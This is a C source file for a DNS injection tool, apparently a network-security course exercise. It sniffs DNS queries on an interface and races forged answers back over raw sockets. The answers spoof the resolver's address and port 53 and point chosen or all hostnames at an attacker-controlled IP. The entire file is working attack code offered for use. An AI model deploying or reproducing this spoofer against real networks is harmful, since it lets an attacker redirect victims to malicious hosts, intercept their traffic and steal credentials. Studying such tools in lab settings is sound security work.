/******************************************************************************
*	dnsinject.c
*	@author: Basava R Kanaparthi (basava.08@gmail.com)
*	DNS Injection - attempts to inject spoofed dns responses
* 	to compile: Run 'make'
* 	use 'dnsinject -h' to get help.
******************************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pcap.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <resolv.h>

#include "headers.h"

char* host_names[MAX_HIJACK_LIST_SIZE];
char* hijack_ips[MAX_HIJACK_LIST_SIZE];

int num_hosts = 0;

/**
 * Prints a terminal message with host IP and request
 */
void print_message(char* request, char* ip){
  printf("Spoofed response:\n \t IP: %15s  DNS Request: %s\n", ip, request);
}

/**
 * Sends a dns answer using raw sockets
 */
void send_dns_answer(char* ip, u_int16_t port, char* packet, int packlen) {
  struct sockaddr_in to_addr;
  int bytes_sent;
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  int one = 1;
  const int *val = &one;
  //printf("DNS Answer : Source IP = %s\n",ip);
  if (sock < 0) {
    fprintf(stderr, "Error creating socket");
    return;
  }
  to_addr.sin_family = AF_INET;
  to_addr.sin_port = htons(port);
  to_addr.sin_addr.s_addr = inet_addr(ip);
  
  if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0){
    fprintf(stderr, "Error at setsockopt()");
    return;
  }
  
  bytes_sent = sendto(sock, packet, packlen, 0, (struct sockaddr *)&to_addr, sizeof(to_addr));
  //printf("bytes sent = %d\n",bytes_sent);
  if(bytes_sent < 0)
    fprintf(stderr, "Error sending data");
}

/**
 * Calculates a checksum for a given header
 */
unsigned short csum(unsigned short *buf, int nwords){
  unsigned long sum;
  for (sum = 0; nwords > 0; nwords--)
    sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return ~sum;
}

/**
 * Builds an UDP/IP datagram
 */
void build_udp_ip_datagram(char* datagram, unsigned int payload_size, char* src_ip, char* dst_ip, u_int16_t port)
{
  
  struct ip *ip_hdr = (struct ip *) datagram;
  struct udphdr *udp_hdr = (struct udphdr *) (datagram + sizeof (struct ip));
  
  ip_hdr->ip_hl = 5; //header length
  ip_hdr->ip_v = 4; //version
  ip_hdr->ip_tos = 0; //tos
  ip_hdr->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + payload_size;  //length
  ip_hdr->ip_id = 0; //id
  ip_hdr->ip_off = 0; //fragment offset
  ip_hdr->ip_ttl = 255; //ttl
  ip_hdr->ip_p = 17; //protocol
  ip_hdr->ip_sum = 0; //temp checksum
  ip_hdr->ip_src.s_addr = inet_addr (dst_ip); //src ip - spoofed
  ip_hdr->ip_dst.s_addr = inet_addr(src_ip); //dst ip
  
  udp_hdr->source = htons(53); //src port - spoofed
  udp_hdr->dest = htons(port); //dst port
  udp_hdr->len = htons(sizeof(struct udphdr) + payload_size); //length
  udp_hdr->check = 0; //checksum - disabled
  
  ip_hdr->ip_sum = csum((unsigned short *) datagram, ip_hdr->ip_len >> 1); //real checksum
  
}

/**
 * Builds a DNS answer
 */
unsigned int build_dns_answer(char *local_ip, struct dnshdr *dns_hdr, char* answer, char* request){
  
  unsigned int size = 0; /* answer size */
  struct dnsquery *dns_query;
  unsigned char ans[4];
  
  sscanf(local_ip, "%d.%d.%d.%d",(int *)&ans[0],(int *)&ans[1], (int *)&ans[2], (int *)&ans[3]);
  
  dns_query = (struct dnsquery*)(((char*) dns_hdr) + sizeof(struct dnshdr));
  
  //dns_hdr
  memcpy(&answer[0], dns_hdr->id, 2); //id
  memcpy(&answer[2], "\x81\x80", 2); //flags
  memcpy(&answer[4], "\x00\x01", 2); //qdcount
  memcpy(&answer[6], "\x00\x01", 2); //ancount
  memcpy(&answer[8], "\x00\x00", 2); //nscount
  memcpy(&answer[10], "\x00\x00", 2); //arcount

  //dns_query
  size = strlen(request)+2;// +1 for the size of the first string; +1 for the last '.'
  memcpy(&answer[12], dns_query, size); //qname
  size+=12;
  memcpy(&answer[size], "\x00\x01", 2); //type
  size+=2;
  memcpy(&answer[size], "\x00\x01", 2); //class
  size+=2;

  //dns_answer
  memcpy(&answer[size], "\xc0\x0c", 2); //pointer to qname
  size+=2;
  memcpy(&answer[size], "\x00\x01", 2); //type
  size+=2;
  memcpy(&answer[size], "\x00\x01", 2); //class
  size+=2;
  memcpy(&answer[size], "\x00\x00\x00\x22", 4); //ttl - 34s
  size+=4;
  memcpy(&answer[size], "\x00\x04", 2); //rdata length
  size+=2;
  memcpy(&answer[size], ans, 4); //rdata
  size+=4;
  
  return size;
  
}

/**
 * Extracts the request from a dns query
 * It comes in this format: [3]www[7]example[3]com[0]
 * And it is returned in this: www.example.com
 */
void extract_dns_request(struct dnsquery *dns_query, char *request){
  unsigned int i, j, k;
  char *curr = dns_query->qname;
  unsigned int size;
  
  size = curr[0];

  j=0;
  i=1;
  while(size > 0){
    for(k=0; k<size; k++){
      request[j++] = curr[i+k];
    }
    request[j++]='.';
    i+=size;
    size = curr[i++];
  }
  request[--j] = '\0';
}

/**
 * Extracts the src port from a udp header
 */
void extract_port_from_udphdr(struct udphdr* udp, u_int16_t* port){
  (*port) = ntohs((*(u_int16_t*)udp));
}

/**
 * Extracts an ip from a ip header
 */
void extract_ip_from_iphdr(u_int32_t raw_ip, char* ip){
  int i;
  int aux[4];
  
  for(i=0;i<4;i++){
    aux[i] = (raw_ip >> (i*8)) & 0xff;
  }
  
  sprintf(ip, "%d.%d.%d.%d",aux[0], aux[1], aux[2], aux[3]);
}

/**
 * Extracts DNS query and ip from packet
 */
void extract_dns_data(const u_char *packet, struct dnshdr **dns_hdr, struct dnsquery *dns_query, char* src_ip, char* dst_ip, u_int16_t *port){
  struct etherhdr *ether;
  struct iphdr *ip;
  struct udphdr *udp;
  unsigned int ip_header_size;
  
  /* ethernet header */
  ether = (struct etherhdr*)(packet);
  /* ip header */
  ip = (struct iphdr*)(((char*) ether) + sizeof(struct etherhdr));
  extract_ip_from_iphdr(ip->saddr, src_ip);
  extract_ip_from_iphdr(ip->daddr, dst_ip);
  
  /* udp header */
  ip_header_size = ip->ihl*4;
  udp = (struct udphdr *)(((char*) ip) + ip_header_size);
  extract_port_from_udphdr(udp, port);

  /* dns header */
  *dns_hdr = (struct dnshdr*)(((char*) udp) + sizeof(struct udphdr));

  dns_query->qname = ((char*) *dns_hdr) + sizeof(struct dnshdr);
  /*
  for(int i=0;i<strlen(dns_query->qname);i++){
  	printf("%02X\n",dns_query->qname[i]);
  }*/
}

/**
 * Callback function to handle packets
 */
void handle_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
  char *local_ip;
  struct dnsquery dns_query;
  struct dnshdr *dns_hdr;

  char request[REQUEST_SIZE];
  char src_ip[IP_SIZE], dst_ip[IP_SIZE];
  u_int16_t port;

  char datagram[DATAGRAM_SIZE];
  char* answer;
  unsigned int datagram_size; 
  int i =0;
  int flag_host_match = 0;
  local_ip = (char*)args;

  memset(datagram, 0, DATAGRAM_SIZE);
  extract_dns_data(packet, &dns_hdr, &dns_query, src_ip, dst_ip, &port);
  extract_dns_request(&dns_query, request);
  
  if(num_hosts > 0)
  {
	for(i =0; i < num_hosts; i++)
  	{
		if(strcmp(host_names[i],request) == 0){
			strcpy(local_ip ,hijack_ips[i]);
			flag_host_match = 1;
			break;
		}
  	}
  	if (flag_host_match == 0)
		return; //Don't alter other requests.
  }
  
    //printf("IP = %s\n",local_ip);
    /* answer is pointed to the beginning of dns header */
    answer = datagram + sizeof(struct ip) + sizeof(struct udphdr);

    /* modifies answer to attend our dns spoof and returns its size */
    datagram_size = build_dns_answer(local_ip, dns_hdr, answer, request);
    
    /* modifies udp/ip to attend our dns spoof */
    build_udp_ip_datagram(datagram, datagram_size, src_ip, dst_ip, port);
    
    /* update the datagram size with ip and udp header */
    datagram_size += (sizeof(struct ip) + sizeof(struct udphdr));
    
    /* sends our dns spoof msg */
    send_dns_answer(src_ip, port, datagram, datagram_size); 

    print_message(request, local_ip);

 // }
}

/**
* 	Helper function to print the typical usage of the program.
*/
void usage_help()
{
	printf("Usage: mydump [-i interface] [-r file] [-s string] [-h] expression\n");
	printf("\n");
	printf("Options:\n");
	printf("\t-i  Listen on network device <interface> (e.g., eth0).\n\tIf not specified, default interface is chosen to listen on.\n ");
	printf("\n");
	printf("\t-f <file> to read a list of IP address and hostname pairs specifying the hostnames to be hijacked. \n");
	printf("\n");
	printf("\t-h Prints this message about program usage.\n");
	printf("\n");
	printf("\t<expression> is a BPF filter that specifies which packets will be dumped. \n \tIf no"
		" filter is given, all packets seen on the interface (or contained in the trace)\n\t"
		"will be dumped. Otherwise, only packets matching <expression> will be dumped.\n\n");
}


/**
 * Read the file of list of hijacked IPs and hosts
 * and save them in 2 arrays of hostnames and corresponding IPs.
 */
void read_file(char *filename){
  FILE *fp;
  char *line = NULL;
  size_t len = 0;
  ssize_t read;
  char *token = NULL;
  int cnt = 0;

  fp = fopen(filename,"r");
  if(fp==NULL)
    	exit(0);
  
  while((read = getline(&line, &len, fp)) != -1)
  {
	//printf("%s\n",line);
	while((token = strsep(&line, " ")) != NULL)
	{
		if(token[strlen(token) -1] == '\n')
			token[strlen(token)-1] = '\0';
		//printf("%s\n",token);
 		if(cnt==0)
		{
			hijack_ips[num_hosts] = (char*)malloc(sizeof(char)*strlen(token));
			strcpy(hijack_ips[num_hosts],token);
			cnt++;
		}
		else{
			host_names[num_hosts] = (char*)malloc(sizeof(char)*strlen(token));
			strcpy(host_names[num_hosts],token);
			cnt--;
		}		
		//printf("%s\n",token);
	}
	num_hosts++;
  }

  for(int i=0;i < num_hosts;i++)
  {
	printf(" IP: %15s, hostname: %s\n", hijack_ips[i], host_names[i]);
  }
  
  fclose(fp);
  if(line)
      	free(line);
}

/**
 * This is the main function
 * Gets the args and runs the filter
 */
int main(int argc, char **argv){
  //SpoofParams *spoof_params; /* arguments */
  int opt;
  struct ifreq ifr;
  int n;
  int fileflag = 0;
  int index = 0;
  
  char *interface;
  char *file_name;
  char local_ip[IP_SIZE];
  
  int filter_exp_len = 0;		 /* The length of BPF filter expression. */
  char *filter_exp;				 /* The filter expression */
 
  char errbuf[PCAP_ERRBUF_SIZE]; /* pcap error messages buffer */
  struct bpf_program fp;         /* compiled filter */
  pcap_t *handle;
 
  char *dns_exp = "udp and dst port domain";
   
  interface = (char *) malloc(sizeof(char)*(PCAP_INTERFACENAME_SIZE));
  
  while((opt= getopt(argc,argv, "i:f:")) != -1)
  {
	switch(opt)
	{
		case 'i':
			//interface = (char *)malloc(sizeof(char)*(strlen(optarg)+1));
			strncpy(interface, optarg, PCAP_INTERFACENAME_SIZE-1);
			strcat(interface,"\0");
			break;
		case 'f':
			fileflag = 1;
			file_name = (char *) malloc(sizeof(char)*(strlen(optarg) + 1));
			strcpy(file_name,optarg);
			break;
		default:
			usage_help();
			exit(0);
	}
  }
 
  /* Compute the size of the expression even
		 if they are not given as a string (in quoutes) */
	for (index = optind; index < argc; index++){
		filter_exp_len += strlen(argv[index]) + 1;
	}
	// Expand memory for the DNS expression
	filter_exp_len += strlen(dns_exp) + 1;
	
	if(optind < argc)
	{
		filter_exp_len += strlen(" and ") + 1;
		// Allocate appropriate memory for the BPF filter expression.
		filter_exp = (char *) malloc(sizeof(char)*(filter_exp_len + 1));
		
		filter_exp[0] = '\0';
		//Concatenate filter_exp with dns_exp
		strcat(filter_exp,dns_exp);
		strcat(filter_exp," and ");
		/* Concatenate even if the BPF filter is
		 space separated and not bound in quotes.*/
		for (index = optind; index < argc; index++)
		{
			strcat(filter_exp,argv[index]);
			strcat(filter_exp, " ");
		}
	}
	else
	{
		// Allocate appropriate memory for the BPF filter expression.
		printf("Filter_exp_len: %d\n",filter_exp_len);
		filter_exp = (char *) malloc(sizeof(char)*(filter_exp_len + 1));
		printf("Filter_exp_len: %d\n",filter_exp_len);
		filter_exp[0] = '\0';
		//Concatenate filter_exp with dns_exp
		printf("Filter_exp_len: %d\n",filter_exp_len);
		strcat(filter_exp,dns_exp);
	}
	
  printf("BPF Filter:\n \t %s\n", filter_exp);
  
  if(interface == NULL || strlen(interface) == 0)
  {
	  //interface = (char *)malloc(sizeof(char)*(strlen(optarg)+1)); 
	  interface = pcap_lookupdev(errbuf);
  }
  
  /* Throw an error if default device is not found. */
	if (interface == NULL) {
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
		return(2);
	}
  printf("Interface:\n \t %s\n",interface);
  
  //parse_args(argc, argv, &spoof_params);
  if(fileflag != 1)
  {
    n = socket(AF_INET, SOCK_DGRAM, 0);
  	ifr.ifr_addr.sa_family = AF_INET;
 	strncpy(ifr.ifr_name,interface, IFNAMSIZ-1);
  	ioctl(n, SIOCGIFADDR, &ifr);
	close(n);
  
  
  	printf("Local IP Address = %s\n", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
  
  	strncpy(local_ip, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr),IP_SIZE-1);
  	local_ip[IP_SIZE-1] = '\0';
  }
  
  else{
	printf("Filename = %s\n",file_name);
  	read_file(file_name);
  }
  

  memset(errbuf, 0, PCAP_ERRBUF_SIZE);
  
  handle = pcap_open_live(interface, /* device to sniff on */
                          BUFSIZ,                  /* maximum number of bytes to capture per packet */
                          1,                       /* promisc - 1 to set card in promiscuous mode, 0 to not */
                          0,                       /* to_ms - amount of time to perform packet capture in milliseconds */
                                                   /* 0 = sniff until error */
                          errbuf);                 /* error message buffer if something goes wrong */

  
  if (handle == NULL)   /* there was an error */
  {
    fprintf (stderr, "%s", errbuf);
    exit (1);
  }

  if (strlen(errbuf) > 0)
  {
    fprintf (stderr, "Warning: %s", errbuf);  /* a warning was generated */
    errbuf[0] = 0;    /* reset error buffer */
  }
  

  
  /* compiles the filter expression */
  if(pcap_compile(handle, &fp,filter_exp, 0, 0) == -1){
    fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
    exit(-1);
  }
  
  /* applies the filter */
  if (pcap_setfilter(handle, &fp) == -1) {
    fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
    exit(-1);
  }
  
  /* loops through the packets */
  pcap_loop(handle, NUM_PACKETS, handle_packet, (u_char*)local_ip);
  
  /* frees the compiled filter */
  pcap_freecode(&fp);
  
  /* closes the handler */
  pcap_close(handle);
  
  /* And close the session */
 // Free the memory, before leaving
	if(file_name)
		free(file_name);
	if(filter_exp)
		free(filter_exp);
	if(interface)
		free(interface);

  return 0;
}
